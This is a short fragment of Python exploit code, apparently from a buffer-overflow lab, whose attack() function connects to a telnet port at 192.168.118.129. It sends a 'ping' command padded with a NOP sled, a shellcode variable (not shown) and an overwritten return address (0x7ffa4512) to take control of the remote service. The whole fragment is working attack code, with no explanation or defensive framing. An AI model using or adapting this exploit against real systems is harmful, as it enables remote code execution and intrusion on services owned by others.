...
def attack(host='192.168.118.129',port=23):
 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
  sock.connect((host,port))
  exploitcode = ((b"\x90" *4 + shellcode).ljust(1012,b"\x90") + bytes.fromhex('7ffa4512')[::-1]).ljust(2000,b"\x90")
  data = b'ping ' + exploitcode + bytes.fromhex('7ffa4512')[::-1] + b'\r\n'
  sock.send(data)
  sock.recv(1000)
